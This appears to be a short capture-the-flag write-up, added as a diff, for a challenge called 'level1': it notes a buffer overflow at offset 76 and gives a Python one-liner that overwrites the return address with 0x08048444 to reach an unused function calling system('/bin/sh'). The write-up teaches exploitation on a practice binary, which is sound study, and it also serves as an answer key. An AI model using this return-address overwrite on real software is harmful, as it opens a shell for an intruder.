@@ -1,0 +1,12 @@
+# level1
+
+We have a buffer overflow at index 76
+
+We see that we have a function called `run` with `system("/bin/sh")`
+unused that we can exploit at `0x08048444`
+
+```py
+padding = "A"*76
+eax = "\x44\x84\x04\x08"
+print(padding+eax)
+```
